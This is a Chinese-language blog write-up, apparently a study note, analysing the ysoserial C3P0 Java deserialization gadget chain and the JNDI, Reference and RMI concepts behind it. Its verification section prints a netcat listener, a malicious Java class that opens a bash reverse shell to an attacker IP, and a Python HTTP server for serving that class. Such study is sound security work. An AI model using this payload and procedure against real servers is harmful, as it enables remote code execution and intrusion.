---
layout: post
title: Web-Java-反序列化漏洞-ysoserial-C3P0
excerpt: "C3P0是一个开源的JDBC连接池，它实现了数据源与JNDI绑定，支持JDBC3规范以及JDBC2的标准扩展。本例中演示了基于该工程下的PoolBackedDataSourceBase的反序列化漏洞，通过该漏洞可以实现远程代码执行。"
date:   2021-08-02 11:51:00
categories: [CTF]
comments: true
---

## 背景知识

1. *ysoserial*包含了许多针对通用Java依赖包的小工具链，可以在正常情况下通过使目标程序进行不安全的反序列化实现攻击利用。

2. Gadgets

   ```java
   /*
    * PoolBackedDataSourceBase.readObject()
    *		IndirectlySerialized/ReferenceSerialized.getObject()
    *			ReferenceableUtils.referenceToObject( Reference ref, Name name, Context nameCtx, Hashtable env)
    *				Class.forName(String name, boolean initialize, ClassLoader loader)
    *				ObjectFactory.newInstance()
    *					invoke malicious Constructor of Attacker's malicious class
    */
   ```

3. Java序列化

   * Java原生序列化和反序列化将属性的类名同时写入到了序列化流中
   * Java反序列化时会调用ObjectInputStream的readObject()方法来进行反序列化
   * 无论反序列化是否成功，只要读取到类名就会加载这个类，如果该类有自定义的readObjec()就执行自定义的readObject()方法，如果没有就按照默认的readObject()流程执行，因此只要readObject()存在调用点，无论业务代码中是否使用了这些类，都会执行readObject()过程从而执行恶意代码

4. C3P0

   * C3P0是一个开源的JDBC连接池，它实现了数据源与JNDI的绑定，支持JDBC3规范和JDBC2的标准扩展，使用它的开源项目有Hibernate、Spring。
   * [传统JDBC开发模式](https://github.com/MonkeyDatabase/LearningJDBC/blob/main/src/io/github/monkeydatabase/jdbc/Statement_WithSQLInjection.java)
     * 注册驱动
     * 获取连接Connection
     * 获取数据库处理对象Statement
     * 执行SQL语句
     * 处理查询结果集ResultSet
     * 释放资源
   * 为解决传统开发模式中“一旦需要数据库连接就必须向数据库重新认证申请连接，执行完成后再断开连接”带来的时间开销，采用数据库连接池技术来进行缓解。
     * 为数据库建立一个缓冲池，在缓冲池中创建指定数量的数据库连接
     * 每当有连接请求时，从缓冲池中取出处于“空闲”状态的连接，并将此连接标记为“忙碌”状态，直到该连接请求处理完成后将该连接标记为“空闲状态”等待下次使用
     * 无论数据库连接池中的连接是否被使用，都会保持最小连接数以应对流量的变化，如果连接数超过当前数据库连接池中的连接数会按照配置的自增长数增加连接直到达到最大连接数

## 验证过程

* 配置环境

  * `com.mchange`:`c3p0:0.9.5.2`
  * `com.mchange`:`mchange-commons-java:0.2.11`
  * jdk1.8(非必须)

* 在12345端口打开监听，等待反弹shell连接，该连接用于获取远程shell

  ```shell
  nc -l 12345
  ```
  
* 准备被靶机通过Reference获取的恶意类

  ```java
  public class Exploit {
      public Exploit(){
          try {
              Runtime r = Runtime.getRuntime();
              Process p = r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/192.168.59.128/12345 0>&1"});
          } catch (Exception e) {
              System.out.println(e);
          }
      }
  }
  ```

* 将该类编译后放到任意目录，然后在该目录中启动一个HTTP服务等待靶机连接，该连接用于将恶意类返回给靶机

  ```
  python -m SimpleHTTPServer 9999
  ```

* 在IDEA中运行C3P0.java，配置Program 参数为`http://ip:port/:classname`

  * ip、port为用于返回恶意类的地址
  * classname为返回的恶意类的类名
  * 将参数在输入给C3P0之后，会以最后一个`:`拆分为两个参数
    * url：`http://ip:port/`
    * classname:`classname`

  ![image-20210805153009076](https://monkeydatabase.github.io/img/image-20210805153009076.png)

* 运行之后，首先用于返回恶意类的监听会显示一条HTTP请求日志

  <img src="https://monkeydatabase.github.io/img/image-20210805153915476.png" alt="image-20210805153915476" style="zoom:105%;" />

* 然后等待反弹shell的监听会捕获到来自靶机的webshell

  <img src="https://monkeydatabase.github.io/img/image-20210805154324070.png" alt="image-20210805154324070" style="zoom:90%;" />



## 攻击原理

1. 序列化时，构造Payload过程中首先调用了`PoolBackedDataSourceBase.writeObject()`，其中有个关键的点，它在序列化`connectionPoolDataSource`和`extensions`两个成员属性时，进行了如下操作

   ```java
   /*
    *	PoolBackedDataSourceBase.writeObject()
    *		SerializableUtils.toByteArray()	测试对象是否可序列化
    *			ReferenceIndirector.indirectForm() 若不可序列化则将其转化为ReferenceSerialized
    */
   ```

   * 先调用了c3p0自带的一个工具类SerializableUtils的序列化方法，其中声明了一个单独的ObjectOutputStream尝试对该对象进行序列化
     * 若不抛出NotSerializableException异常，则当前对象实现了Serializable接口，可以进行序列化
     * 若抛出NotSerializableException异常，则当前对象未实现Serializable接口，无法完成序列化，也不对原有的输出流造成影响
   * 如果对象无法序列化，则使用c3p0中定义的`Indirector`接口及其实现类`ReferenceIndirector`将实现了`Referenceable`接口的对象转化为实现了`Serializable`接口和`IndirectlySerialized`接口的`ReferenceSerialized`对象，从而实现对原本无法序列化的对象进行序列化操作

2. C3P0的Payload中构造的`connectionPoolDataSource`是不可序列化的，它实现了`Referenceable`接口，其`getReference()`相关方法如下。

   * 将提供恶意类的url赋值给了Reference的classFactoryLocation属性
   * 将恶意类的类名赋值给了Reference的classFactory属性
   * 将固定字符串"exploit"赋值给了Reference的className属性

   ```java
   public PoolSource ( String className, String url ) {
       this.className = className;
       this.url = url;
   }
   
   public Reference getReference () throws NamingException {
       return new Reference("exploit", this.className, this.url);
   }
   
   public Reference(String className, String factory, String factoryLocation) {
       this(className);
       classFactory = factory;
       classFactoryLocation = factoryLocation;
   }
   
   public Reference(String className) {
       this.className  = className;
       addrs = new Vector<>();
   }
   ```

3. 反序列化时，由于Payload最外层为`PoolBackedDataSourceBase`对象，所以会首先调用以下方法`PoolBackedDataSourceBase.readObject()`，它按照序列化的顺序依次读取内容，在反序列化`connectionPoolDataSource`和`extensions`两个参数时进行了如下操作

   * 反序列化出对象存储到Object类型的对象中

   * 检查该object是否实现了`IndirectlySerialized`接口，因为在序列化时会在这两个属性不可序列化时将其转化为实现了`IndirectlySerialized`接口的`ReferenceSerialized`类的实例，因此在调用`IndirectlySerialized.getObject()`来获取间接实例化的对象的过程中实际调用的是`ReferenceSerialized.getObject()`。

     > 成功转换为`ReferenceSerialized`实例的对象一定实现了`Referenceable`接口，所以通过其中存储的Reference对象可获取到序列化之前的对象。

   ```java
   private void readObject( ObjectInputStream ois ) throws IOException, ClassNotFoundException {
       short version = ois.readShort();
       switch (version) {
           case VERSION:
               // we create an artificial scope so that we can use the name o for all indirectly serialized objects.
               {
                   Object o = ois.readObject();
                   if (o instanceof IndirectlySerialized) 
                       o = ((IndirectlySerialized) o).getObject();
                   this.connectionPoolDataSource = (ConnectionPoolDataSource) o;
               }
               this.dataSourceName = (String) ois.readObject();
               // we create an artificial scope so that we can use the name o for all indirectly serialized objects.
               {
                   Object o = ois.readObject();
                   if (o instanceof IndirectlySerialized) o = ((IndirectlySerialized) o).getObject();
                   this.extensions = (Map) o;
               }
               this.factoryClassLocation = (String) ois.readObject();
               this.identityToken = (String) ois.readObject();
               this.numHelperThreads = ois.readInt();
               this.pcs = new PropertyChangeSupport( this );
               this.vcs = new VetoableChangeSupport( this );
               break;
           default:
               throw new IOException("Unsupported Serialized Version: " + version);
       }
   }
   ```

4. 接下来看`IndirectlySerialized.getObject()`，它创建了两个Context，然后调用`ReferenceableUtils.referenceToObject()`根据Reference获取目标对象

   ```java
   public ReferenceSerialized( Reference reference, Name name, Name contextName, Hashtable env ) {
       this.reference = reference;
       this.name = name;
       this.contextName = contextName;
       this.env = env;
   }
   
   public Object getObject() throws ClassNotFoundException, IOException {
       try {
           Context initialContext;
           if ( env == null )
               initialContext = new InitialContext();
           else
               initialContext = new InitialContext( env );
   
           Context nameContext = null;
           if ( contextName != null )
               nameContext = (Context) initialContext.lookup( contextName );
   
           return ReferenceableUtils.referenceToObject( reference, name, nameContext, env ); 
       }
       /* Leave out lots of codes for try-catch */
   }
   ```

5. 接下来看`ReferenceableUtils.referenceToObject()`

   * 读取Reference中的classFactory(攻击者的恶意类名className)并赋值给fClassName
   * 读取Reference中的classFactoryLocation(攻击者的恶意类URL地址classFactoryLocation)并赋值给fClassLocation
   * 当用户设置了Reference的classFactoryLocation属性时，用该属性创建一个URLClassLoader
   * 调用Class.forName()使用这个URLClassLoader加载指定名字的工厂类，此时提供恶意类的监听会打印出HTTP请求记录
   * fClass.newInstance()通过反射获取并调用了恶意类的构造方法创建该恶意类的实例，其过程中反弹shell到监听shell的攻击机，**攻击完成**

   ```java
   public static Object referenceToObject( Reference ref, Name name, Context nameCtx, Hashtable env) throws NamingException {
   	try {
           String fClassName = ref.getFactoryClassName();
           String fClassLocation = ref.getFactoryClassLocation();
   
           ClassLoader defaultClassLoader = Thread.currentThread().getContextClassLoader();
           if ( defaultClassLoader == null ) 
               defaultClassLoader = ReferenceableUtils.class.getClassLoader();
   
           ClassLoader cl;
           if ( fClassLocation == null )
               cl = defaultClassLoader;
           else {
               URL u = new URL( fClassLocation );
               cl = new URLClassLoader( new URL[] { u }, defaultClassLoader );
           }
   
           Class fClass = Class.forName( fClassName, true, cl );
           ObjectFactory of = (ObjectFactory) fClass.newInstance();
           return of.getObjectInstance( ref, name, nameCtx, env );
       }
       /* Leave out lots of codes for try-catch */
   }
   ```

## 独立思考

### 1、javax.naming包是做什么用的？

* javax.naming包为访问命名服务提供类和接口
* 该包下有几个比较显眼的接口
  * Context：代表了一个命名上下文，其中包含了存储name到object的映射关系的集合以及调用和更新这些映射关系的方法
    * lookup(Name/String)获取一个命名对象
    * bind(Name/String, Object)新增一个名称-对象映射对
    * unbind(Name/String)删除一个指定名称的名称-对象映射对
    * rename(Name/String, Name/String)将绑定在旧名字上的对象绑定到新名字，并且对旧名字解除绑定
    * list(Name/String)枚举出Context中指定名称下的NameClassPair，NameClassPair实现了Serializable接口
    * listBindings(Name/String)枚举出Context指定名称下的Binding，Binding继承自NameClassPiar，相较于NameClassPair多了boundObj参数
    
  * Name
    * CompostiteName
    
      * 使用输入的字符串构造一个组合名称
    
    * CompoundName
    
      * 使用输入的字符串构造一个复合名称
    
    * LdapName
    
      * 可以接受任意名称，只有将名称发给LDAP服务器的时候才能知道名称是否有效
    
      * 入参
    
        * name：标识名称(例如`CN=Steve Kille, O=Isode Limited, C=GB`)
    
      * 构造函数
    
        * unparsed：接收入参name
    
        * 调用parse函数进行解析，将解析结果赋值给List\<Rdn\>的rnds属性(例如`{C=GB, O=Isode Limited, CN=Steve Kille}`)
    
          ```java
          /* 
           * 	LdapName.parse()
           *		Rfc2253Parser().parseDn()
           */
          ```
    
          
    
    * DnsName
      * 入参
        * name：URL域名
      * 构造函数
        * domain：将入参name赋值给domain
        * labels：以`.`为分隔拆分name存入ArrayList\<String\>
    
  * NameParser
  
    * 用于解析用户输入的字符串名称，返回实现了Name接口的对象
  
  * NamingEnumeration
    * 继承自`java.util.Enumeration`，用于枚举`javax.naming`包和`javax.naming.directory`包中方法返回的List对象
    
  * Referenceable
  
    * 实现Referenceable接口的对象可以通过getReference()方法返回一个指向自己的Reference对象
    * Reference是一种记录那些没有直接绑定到命名系统中的对象的相关地址信息的一种方式。
    * 在绑定一个对象时，如果这个对象实现了Referenceable接口，那么将会调用他的getReference()方法获取它的Reference对象用来绑定

### 2. javax.naming.Context和命名空间有什么区别？

* javax.naming.Context

  * javax.naming.Context接口的实现类的每个对象都维护了一个自己的命名上下文
  * 绑定的目标是对象，用于供框架内其他组件获取。

* 命名空间

  * 每一个被加载的类有一个`**.class.getName()`，JVM为每一个ClassLoader维护一个命名空间且不支持将一个class重复加载到同一个命名空间。

  * 绑定的目标是class，用于供JVM运行时调用

    * URLClassLoader.findClass(name) 其中将类名的`.`替换为`/`之后在尾部拼接`.class`
    * ClassLoader.defineClass1()是native方法，由C语言实现

    ```java
    /*
     * 	URLClassLoader.findClass(name)
     * 		URLClassLoader.defineClass(String name, Resource res)
     *			SecureClassLoader.defineClass(String name,byte[] b, int off, int len,CodeSource cs)
     *				ClassLoader.defineClass(String name, byte[] b, int off, int len,ProtectionDomain protectionDomain)
     * 					ClassLoader.defineClass1(String name, byte[] b, int off, int len,ProtectionDomain pd, String source);
     */
    ```

### 3. Referenceable和Reference起什么作用？

* Referenceable接口中仅有一个方法`Reference getReference() throws NamingException`，实现该接口的对象可以返回一个指向它本身的Reference对象。

* Reference类记录了它指向对象的地址信息，是指向当前命名系统之外、对象的引用。

  | 属性                 | 类型              | 含义                                         |
  | -------------------- | ----------------- | -------------------------------------------- |
  | className            | String            | 所指向对象的类全限定名                       |
  | addrs                | Vector\<RefAddr\> | 所指向对象的地址，通过构造器初始化           |
  | classFactory         | String            | 所指向对象的工厂类的全限定名，默认初始化为空 |
  | classFactoryLocation | String            | 工厂类的位置，默认初始化为空                 |

* RefAddr抽象类仅包含了addrType属性用于指定当前RefAddr的地址类型(如BSD Printer Address)，RefAddr的子类例如StringRefAddr其中包含了contents属性用于保存具体的地址信息

### 4. JNDI是做什么用的？

* 定义
  * Java Naming Dictionary Interface是Java命名和目录服务接口
  * 目录服务是命名服务的扩展，两者的区别是目录服务中的对象可以有属性，命名服务没有属性，在目录服务中，可以根据属性搜索对象。
* 功能
  * 访问文件系统中的文件
  * 定位远程RMI注册的对象
  * 访问LDAP目录服务
* 攻击可用性
  * JNDI的`com.sun.jndi`包存储在`rt.jar`中，Java运行时中均可以反序列化出该包下的对象

### 5. java.rmi是干什么用的？

* 定义
* 功能
* 实现
  * `com.sun.jndi.rmi.registry.RegistryContext`实现了`javax.naming.Context`接口，是RMI服务的入口
    * 构造函数`RegistryContext(String host, int port, Hashtable<?, ?> env)`接受域名、端口、和一个Hashtable<String, Object>的environments参数
    * `lookup(Name name)`，根据传入的名字通过调用它内部属性registry.lookup()从Registry中获取对象进行解码后返回
    * `decode(Remote r, Name name)`解码从Registry中获取到的对象
      * 首先如果对象是RemoteReference类型，首先对RemoteReference进行解封装
      * 然后调用`NamingManager.getObjectInstance(Object refInfo, Name name, Context nameCtx, Hashtable\<?,?\> environment)`获取对象实例
  * `java.rmi.registry.Registry`是一个指向简单远程对象注册的远程接口，它提供了存储和获取指定名字绑定的远程对象引用
* 攻击可用性
  * `com.sun.jndi.rmi.registry`和`java.rmi`两个包均存储在`rt.jar`中，Java运行时均可反序列化出该包下的对象

### 6. 为什么C3P0的Payload构造参数使用的是base_url和classname？

* base_url：用于提供恶意类的URL，之后会用于构建URLClassLoader

  > 在实践中，发现如果URL如果只写成http://ip:port是无法获取到类的，在最后加上一个目录分隔符http://ip:port/才可以完成攻击，目前这部分的原因还不清楚

* classname：在攻击过程中会被赋值给Reference的工厂类名classFactory属性，后续会用于获取恶意类，因为我们构造Payload过程中将恶意类名赋值给了Reference的工厂类名属性，而在构造Payload过程中生成Reference时Reference的classname属性在攻击过程中并没有用到，只需要将恶意类传给工厂类名属性让靶机获取工厂类并实例化即可实现攻击，无需再通过实例化后的工厂类调用`getObjectInstance()`方法根据Reference对象中的classname再去创建一次对象，**这也是靶机在被攻击后报错的原因**，靶机试图调用恶意类的`getObjectInstance()`失败。

* C3P0 Payload构造参数中的classname并不是Reference类中的classname属性，**这一点可能是理解C3P0攻击原理的一个障碍**。

## 产生过的疑问

1. javax.naming包是做什么用的？
2. javax.naming.Context和命名空间有什么区别？
3. Referencable和Reference起什么作用？
4. JNDI是做什么用的？
5. java.rmi是干什么用的？
6. 为什么C3P0的Payload构造参数使用的是base_url和classname？